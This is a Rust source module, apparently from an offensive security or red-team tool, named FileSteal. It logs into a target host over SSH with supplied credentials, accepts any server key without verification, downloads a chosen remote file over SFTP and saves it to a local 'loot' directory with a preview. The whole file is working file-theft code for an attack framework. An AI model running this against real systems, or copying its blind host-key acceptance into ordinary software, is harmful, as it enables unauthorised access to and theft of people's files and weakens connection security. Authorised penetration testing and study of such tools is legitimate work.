use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncReadExt;
use russh::client;
use russh_sftp::client::SftpSession;
use crate::models::Job;
use crate::state::AppState;

// Guard against accidentally pulling huge files over the wire.
const MAX_FILE_SIZE: usize = 10 * 1024 * 1024; // 10 MB

pub struct FileSteal;

impl FileSteal {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;

        let target      = cfg["target"].as_str().ok_or("Missing target")?;
        let port        = cfg.get("port").and_then(|v| v.as_u64()).unwrap_or(22) as u16;
        let username    = cfg["username"].as_str().ok_or("Missing username")?;
        let password    = cfg["password"].as_str().ok_or("Missing password")?;
        let remote_path = cfg["remote_path"].as_str().ok_or("Missing remote_path")?;

        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:Connecting to {}@{}:{}", job.id, username, target, port
        ));

        let config = Arc::new(client::Config {
            inactivity_timeout: Some(Duration::from_secs(15)),
            ..<_>::default()
        });

        let mut session = tokio::time::timeout(
            Duration::from_secs(15),
            client::connect(config, (target, port), IgnoreServerKey),
        )
        .await
        .map_err(|_| "Connection timeout".to_string())?
        .map_err(|e| format!("SSH connect error: {}", e))?;

        let auth = session
            .authenticate_password(username, password)
            .await
            .map_err(|e| format!("Auth error: {}", e))?;

        if !auth.success() {
            return Err(format!("Authentication failed for {}@{}", username, target));
        }

        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:Authenticated — opening SFTP channel", job.id
        ));

        let channel = session
            .channel_open_session()
            .await
            .map_err(|e| format!("Channel error: {}", e))?;

        channel
            .request_subsystem(true, "sftp")
            .await
            .map_err(|e| format!("SFTP subsystem error: {}", e))?;

        let sftp = SftpSession::new(channel.into_stream())
            .await
            .map_err(|e| format!("SFTP session error: {}", e))?;

        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:Downloading {}", job.id, remote_path
        ));

        let mut remote_file = sftp
            .open(remote_path)
            .await
            .map_err(|e| format!("Cannot open {}: {}", remote_path, e))?;

        let mut contents: Vec<u8> = Vec::new();
        remote_file
            .read_to_end(&mut contents)
            .await
            .map_err(|e| format!("Read error: {}", e))?;

        if contents.len() > MAX_FILE_SIZE {
            return Err(format!(
                "File exceeds {} MB limit ({} bytes)",
                MAX_FILE_SIZE / 1024 / 1024,
                contents.len()
            ));
        }

        // Save to data/loot/<timestamp>_<sanitised_filename>
        let loot_dir = std::path::Path::new("data/loot");
        tokio::fs::create_dir_all(loot_dir)
            .await
            .map_err(|e| format!("Cannot create loot dir: {}", e))?;

        let filename = std::path::Path::new(remote_path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file");
        let safe_filename = filename.replace(['/', '\\', ':', '*', '?', '"', '<', '>', '|'], "_");
        let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
        let local_path = loot_dir.join(format!("{}_{}_{}", target.replace('.', "_"), timestamp, safe_filename));

        tokio::fs::write(&local_path, &contents)
            .await
            .map_err(|e| format!("Cannot write loot file: {}", e))?;

        let local_path_str = local_path.to_string_lossy().to_string();
        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:Saved {} bytes → {}", job.id, contents.len(), local_path_str
        ));

        let results = serde_json::json!({
            "target": target,
            "remote_path": remote_path,
            "local_path": local_path_str,
            "size_bytes": contents.len(),
            "preview": preview_text(&contents),
        });
        Ok(results.to_string())
    }
}

struct IgnoreServerKey;

impl client::Handler for IgnoreServerKey {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _server_public_key: &russh::keys::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

/// Return the first 500 bytes as a UTF-8 string preview if the file is text.
fn preview_text(data: &[u8]) -> Option<String> {
    let chunk = &data[..data.len().min(500)];
    std::str::from_utf8(chunk).ok().map(String::from)
}
